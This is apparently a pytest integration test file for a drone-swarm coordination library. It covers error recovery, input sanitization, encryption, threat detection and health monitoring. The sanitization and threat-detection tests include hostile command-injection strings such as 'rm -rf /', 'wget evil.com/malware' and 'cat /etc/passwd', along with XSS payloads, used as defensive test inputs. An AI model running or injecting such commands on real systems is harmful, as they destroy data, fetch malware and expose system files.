"""Integration tests for robust Fleet-Mind systems."""

import pytest
import asyncio
import time
from unittest.mock import Mock, patch, AsyncMock

from fleet_mind.coordination.swarm_coordinator import SwarmCoordinator, MissionConstraints, MissionStatus
from fleet_mind.communication.webrtc_streamer import WebRTCStreamer, MessagePriority, ReliabilityMode
from fleet_mind.fleet.drone_fleet import DroneFleet, DroneStatus, DroneCapability
from fleet_mind.security import SecurityManager, SecurityLevel
from fleet_mind.monitoring import HealthMonitor, HealthStatus, AlertSeverity
from fleet_mind.utils.error_handling import ErrorHandler, FleetMindError, CommunicationError, PlanningError
from fleet_mind.utils.validation import FleetValidator, ValidationSeverity, ValidationError
from fleet_mind.utils.input_sanitizer import InputSanitizer, SanitizationLevel


class TestRobustErrorHandling:
    """Test robust error handling capabilities."""
    
    @pytest.fixture
    def error_handler(self):
        """Create error handler instance."""
        return ErrorHandler()
    
    @pytest.fixture
    def coordinator(self):
        """Create coordinator with error handling."""
        return SwarmCoordinator(
            llm_model="mock",
            security_level=SecurityLevel.HIGH,
            enable_health_monitoring=True
        )
    
    def test_communication_error_recovery(self, error_handler):
        """Test communication error recovery mechanisms."""
        # Create communication error
        error = CommunicationError("Connection lost", drone_id="test_drone")
        
        # Handle error
        result = error_handler.handle_error(error)
        
        # Verify error was logged and recovery attempted
        assert error.context.component == "communication"
        assert error.context.drone_id == "test_drone"
        assert error.context.severity.value == "high"
    
    def test_planning_error_fallback(self, error_handler):
        """Test planning error fallback mechanisms."""
        # Create planning error
        error = PlanningError("LLM service unavailable", mission_id="test_mission")
        
        # Handle error
        result = error_handler.handle_error(error)
        
        # Verify fallback was attempted
        assert error.context.component == "planning"
        assert error.context.mission_id == "test_mission"
    
    def test_circuit_breaker_activation(self, error_handler):
        """Test circuit breaker activation under load."""
        # Simulate multiple failures
        for i in range(6):  # Exceed threshold of 5
            error = CommunicationError(f"Failure {i}")
            error_handler.handle_error(error)
        
        # Check circuit breaker state
        assert error_handler._is_circuit_breaker_open("communication", "message_transfer")
        
        # Verify error statistics
        stats = error_handler.get_error_statistics()
        assert stats['total_errors'] >= 6
        assert 'communication.message_transfer' in stats['circuit_breaker_states']
    
    @pytest.mark.asyncio
    async def test_coordinator_error_resilience(self, coordinator):
        """Test coordinator resilience to various errors."""
        # Create mock fleet
        fleet = DroneFleet(["drone_1", "drone_2"])
        await coordinator.connect_fleet(fleet)
        
        # Test with invalid mission data
        with pytest.raises(ValueError):
            await coordinator.generate_plan("")
        
        # Test with missing fleet
        coordinator.fleet = None
        with pytest.raises(RuntimeError):
            await coordinator.generate_plan("test mission")
    
    def test_error_context_creation(self):
        """Test proper error context creation."""
        error = FleetMindError("Test error")
        
        assert error.context.error_type == "FleetMindError"
        assert error.context.error_message == "Test error"
        assert error.context.component == "unknown"
        assert error.context.timestamp > 0


class TestInputValidationAndSanitization:
    """Test comprehensive input validation and sanitization."""
    
    @pytest.fixture
    def validator(self):
        """Create validator instance."""
        return FleetValidator()
    
    @pytest.fixture
    def sanitizer(self):
        """Create sanitizer instance."""
        return InputSanitizer()
    
    def test_mission_constraint_validation(self, validator):
        """Test mission constraint validation."""
        # Valid constraints
        valid_constraints = {
            "max_altitude": 100.0,
            "battery_time": 25.0,
            "safety_distance": 10.0
        }
        
        results = validator.validate_mission_constraints(valid_constraints)
        assert any(r.is_valid for r in results)
        
        # Invalid constraints
        invalid_constraints = {
            "max_altitude": 500.0,  # Too high
            "battery_time": -5.0,   # Negative
            "safety_distance": 0.0  # Too small
        }
        
        results = validator.validate_mission_constraints(invalid_constraints)
        errors = [r for r in results if not r.is_valid and r.severity in [ValidationSeverity.ERROR, ValidationSeverity.CRITICAL]]
        assert len(errors) > 0
    
    def test_drone_state_validation(self, validator):
        """Test drone state validation."""
        # Valid drone state
        valid_state = {
            "drone_id": "test_drone_1",
            "position": (10.0, 20.0, 50.0),
            "velocity": (2.0, 1.0, 0.5),
            "orientation": (0.1, 0.2, 1.5),
            "battery_percent": 75.0,
            "health_score": 0.9
        }
        
        results = validator.validate_drone_state(valid_state)
        assert any(r.is_valid for r in results)
        
        # Invalid drone state
        invalid_state = {
            "drone_id": "invalid@drone#id",  # Invalid characters
            "position": (50000, 50000, 600),  # Out of bounds
            "velocity": (100, 100, 100),     # Too fast
            "battery_percent": 150.0,        # Invalid percentage
            "health_score": 2.0              # Out of range
        }
        
        results = validator.validate_drone_state(invalid_state)
        errors = [r for r in results if not r.is_valid]
        assert len(errors) > 0
    
    def test_input_sanitization_xss(self, sanitizer):
        """Test XSS prevention in input sanitization."""
        malicious_input = {
            "mission": "<script>alert('xss')</script>Get sensor data",
            "description": "javascript:void(0)",
            "parameters": {
                "onload": "malicious()",
                "data": "<iframe src='evil.com'></iframe>"
            }
        }
        
        sanitized = sanitizer.sanitize(malicious_input, "mission_input")
        
        # Verify malicious content was removed or escaped
        mission_str = str(sanitized)
        assert "<script>" not in mission_str
        assert "javascript:" not in mission_str
        assert "onload" not in mission_str or "malicious" not in mission_str
        assert "<iframe>" not in mission_str
    
    def test_input_sanitization_command_injection(self, sanitizer):
        """Test command injection prevention."""
        malicious_commands = [
            "move forward; rm -rf /",
            "takeoff && wget evil.com/malware",
            "land | cat /etc/passwd",
            "hover `echo malicious`",
            "status $(malicious_command)"
        ]
        
        for command in malicious_commands:
            sanitized = sanitizer.validate_command(command)
            
            # Verify dangerous characters were removed
            dangerous_chars = ['|', '&', ';', '`', '$', '(', ')']
            for char in dangerous_chars:
                if char in command:
                    assert char not in sanitized or len(sanitized) < len(command)
    
    def test_coordinate_validation(self, sanitizer):
        """Test geographic coordinate validation."""
        # Valid coordinates
        valid_coords = [
            (45.0, -122.0),  # Portland, OR
            (0.0, 0.0),      # Equator/Prime Meridian
            (-90.0, 180.0),  # South Pole, Date Line
            (89.9, -179.9, 1000.0)  # Near North Pole with altitude
        ]
        
        for coords in valid_coords:
            if len(coords) == 2:
                result = sanitizer.validate_coordinates(coords[0], coords[1])
                assert len(result) == 2
            else:
                result = sanitizer.validate_coordinates(coords[0], coords[1], coords[2])
                assert len(result) == 3
        
        # Invalid coordinates
        invalid_coords = [
            (91.0, 0.0),      # Invalid latitude
            (0.0, 181.0),     # Invalid longitude
            (45.0, -122.0, -2000.0),  # Invalid altitude
        ]
        
        for coords in invalid_coords:
            with pytest.raises(ValueError):
                if len(coords) == 2:
                    sanitizer.validate_coordinates(coords[0], coords[1])
                else:
                    sanitizer.validate_coordinates(coords[0], coords[1], coords[2])
    
    def test_json_validation(self, sanitizer):
        """Test JSON input validation."""
        # Valid JSON
        valid_json = '{"mission": "patrol area", "drones": 5}'
        result = sanitizer.validate_json(valid_json)
        assert isinstance(result, dict)
        assert "mission" in result
        
        # Invalid JSON
        invalid_json = '{"mission": "patrol", "invalid": }'
        with pytest.raises(ValueError):
            sanitizer.validate_json(invalid_json)
    
    def test_nested_data_sanitization(self, sanitizer):
        """Test sanitization of deeply nested data structures."""
        nested_data = {
            "level1": {
                "level2": {
                    "level3": {
                        "malicious": "<script>alert('deep')</script>",
                        "list": ["item1", "javascript:void(0)", "item3"],
                        "tuple": ("good", "<iframe src='bad'></iframe>", "data")
                    }
                }
            }
        }
        
        sanitized = sanitizer.sanitize(nested_data, "nested_input")
        
        # Verify deep sanitization occurred
        deep_str = str(sanitized)
        assert "<script>" not in deep_str
        assert "javascript:" not in deep_str
        assert "<iframe>" not in deep_str


class TestSecurityIntegration:
    """Test security system integration."""
    
    @pytest.fixture
    def security_manager(self):
        """Create security manager."""
        return SecurityManager(
            security_level=SecurityLevel.HIGH,
            enable_threat_detection=True
        )
    
    def test_drone_authentication(self, security_manager):
        """Test drone authentication flow."""
        # Generate credentials
        credentials = security_manager.generate_drone_credentials(
            "test_drone",
            permissions={"basic_flight", "telemetry"}
        )
        
        assert credentials.drone_id == "test_drone"
        assert "basic_flight" in credentials.permissions
        assert credentials.expires_at > time.time()
        
        # Test authentication with mock token
        token = "mock_jwt_token"
        # Note: This would fail with real JWT validation
        # In production, proper JWT tokens would be used
    
    def test_message_encryption_decryption(self, security_manager):
        """Test message encryption and decryption."""
        original_message = {
            "type": "command",
            "action": "move",
            "parameters": {"x": 10, "y": 20, "z": 30}
        }
        
        # Encrypt message
        encrypted = security_manager.encrypt_message(
            original_message,
            recipient="test_drone",
            security_level=SecurityLevel.HIGH
        )
        
        assert "ciphertext" in encrypted
        assert "integrity_hash" in encrypted
        assert encrypted["security_level"] == "high"
        
        # Decrypt message
        decrypted = security_manager.decrypt_message(encrypted, "test_drone")
        
        # Note: In mock environment, decryption might not be perfect
        # In production with proper crypto libraries, this would match exactly
        assert isinstance(decrypted, (dict, str))
    
    def test_threat_detection(self, security_manager):
        """Test threat detection capabilities."""
        # Test command injection detection
        malicious_message = {
            "command": "move; rm -rf /",
            "data": "$(malicious_code)"
        }
        
        threats = security_manager.detect_threats(malicious_message, "suspicious_source")
        
        # Should detect command injection
        assert len(threats) > 0
    
    def test_key_rotation(self, security_manager):
        """Test security key rotation."""
        # Generate initial credentials
        security_manager.generate_drone_credentials("test_drone")
        
        # Get initial key count
        initial_keys = len(security_manager.session_keys)
        
        # Force key rotation
        security_manager.last_key_rotation = time.time() - 7200  # 2 hours ago
        security_manager.rotate_keys()
        
        # Verify keys were rotated
        assert len(security_manager.session_keys) >= initial_keys


class TestHealthMonitoringIntegration:
    """Test health monitoring integration."""
    
    @pytest.fixture
    async def health_monitor(self):
        """Create health monitor."""
        monitor = HealthMonitor(
            check_interval=1.0,  # Fast for testing
            enable_system_monitoring=True
        )
        await monitor.start_monitoring()
        yield monitor
        await monitor.stop_monitoring()
    
    @pytest.mark.asyncio
    async def test_component_health_tracking(self, health_monitor):
        """Test component health tracking."""
        # Register components
        health_monitor.register_component("coordinator")
        health_monitor.register_component("webrtc_streamer")
        
        # Update metrics
        health_monitor.update_metric("coordinator", "missions_completed", 5.0)
        health_monitor.update_metric("coordinator", "error_rate", 0.02)
        health_monitor.update_metric("webrtc_streamer", "latency", 45.0, "ms")
        
        # Check component health
        coord_health = health_monitor.get_component_health("coordinator")
        assert coord_health is not None
        assert coord_health.component_name == "coordinator"
        assert "missions_completed" in coord_health.metrics
        assert "error_rate" in coord_health.metrics
        
        # Check system health
        system_health = health_monitor.get_system_health()
        assert system_health["total_components"] == 2
        assert system_health["overall_status"] in ["good", "excellent", "warning", "critical", "failed"]
    
    @pytest.mark.asyncio
    async def test_alert_generation(self, health_monitor):
        """Test health alert generation."""
        # Set up alert callback
        alerts_received = []
        health_monitor.add_alert_callback(lambda alert: alerts_received.append(alert))
        
        # Trigger critical condition
        health_monitor.update_metric("test_component", "error_rate", 0.15)  # Above critical threshold
        
        # Wait briefly for processing
        await asyncio.sleep(0.1)
        
        # Verify alert was generated
        alerts = health_monitor.get_alerts(active_only=True)
        assert len(alerts) > 0
        
        critical_alerts = [a for a in alerts if a.severity == AlertSeverity.CRITICAL]
        assert len(critical_alerts) > 0
        
        # Verify callback was called
        assert len(alerts_received) > 0
    
    @pytest.mark.asyncio
    async def test_health_monitoring_loop(self, health_monitor):
        """Test continuous health monitoring."""
        # Let monitoring run for a short period
        await asyncio.sleep(2.5)
        
        # Verify system metrics were collected
        system_health = health_monitor.get_component_health("system")
        
        # Note: system metrics only available if psutil is installed
        if system_health:
            # Should have collected some system metrics
            assert len(system_health.metrics) > 0


class TestEndToEndRobustness:
    """Test end-to-end system robustness."""
    
    @pytest.mark.asyncio
    async def test_complete_system_integration(self):
        """Test complete system integration with error injection."""
        # Create system components
        coordinator = SwarmCoordinator(
            llm_model="mock",
            security_level=SecurityLevel.HIGH,
            enable_health_monitoring=True
        )
        
        fleet = DroneFleet(["drone_1", "drone_2", "drone_3"])
        await coordinator.connect_fleet(fleet)
        
        # Test mission generation with various inputs
        test_missions = [
            "Survey the area safely",
            "",  # Empty mission (should handle gracefully)
            "A" * 20000,  # Very long mission (should be truncated)
            "<script>alert('xss')</script>Patrol zone",  # XSS attempt
        ]
        
        successful_plans = 0
        for mission in test_missions:
            try:
                plan = await coordinator.generate_plan(mission)
                if plan:
                    successful_plans += 1
            except (ValueError, RuntimeError) as e:
                # Expected for invalid inputs
                print(f"Handled invalid input: {e}")
        
        # Should successfully generate at least one plan
        assert successful_plans >= 1
        
        # Test system health
        status = await coordinator.get_swarm_status()
        assert "mission_status" in status
        assert "swarm_state" in status
    
    @pytest.mark.asyncio
    async def test_fault_tolerance_scenarios(self):
        """Test various fault tolerance scenarios."""
        coordinator = SwarmCoordinator(llm_model="mock")
        fleet = DroneFleet(["drone_1", "drone_2", "drone_3", "drone_4", "drone_5"])
        
        await coordinator.connect_fleet(fleet)
        await fleet.start_monitoring()
        
        try:
            # Simulate drone failures
            fleet.update_drone_state("drone_1", status=DroneStatus.FAILED)
            fleet.update_drone_state("drone_2", battery_percent=5.0)  # Critical battery
            fleet.update_drone_state("drone_3", health_score=0.3)      # Poor health
            
            # Wait for health checks to process
            await asyncio.sleep(1.0)
            
            # Verify fleet adapted to failures
            active_drones = fleet.get_active_drones()
            failed_drones = fleet.get_failed_drones()
            
            assert len(failed_drones) >= 1
            assert "drone_1" in failed_drones
            
            # Test emergency procedures
            results = await fleet.execute_emergency_procedure("emergency_land")
            assert isinstance(results, dict)
            
            # Test auto-healing
            healing_results = await fleet.auto_heal_fleet()
            assert "drones_recovered" in healing_results
            assert "issues_resolved" in healing_results
            
        finally:
            await fleet.stop_monitoring()
    
    @pytest.mark.asyncio
    async def test_performance_under_load(self):
        """Test system performance under load."""
        coordinator = SwarmCoordinator(llm_model="mock")
        fleet = DroneFleet([f"drone_{i}" for i in range(50)])  # Larger fleet
        
        await coordinator.connect_fleet(fleet)
        
        # Generate multiple concurrent plans
        start_time = time.time()
        
        tasks = []
        for i in range(10):
            task = coordinator.generate_plan(f"Mission {i}: patrol sector {i}")
            tasks.append(task)
        
        # Execute concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Verify reasonable performance
        assert total_time < 10.0  # Should complete within 10 seconds
        
        # Count successful plans
        successful = sum(1 for r in results if isinstance(r, dict) and not isinstance(r, Exception))
        assert successful >= 5  # At least half should succeed
        
        # Verify system health stats
        stats = coordinator.get_comprehensive_stats()
        assert "performance_stats" in stats
        assert "swarm_status" in stats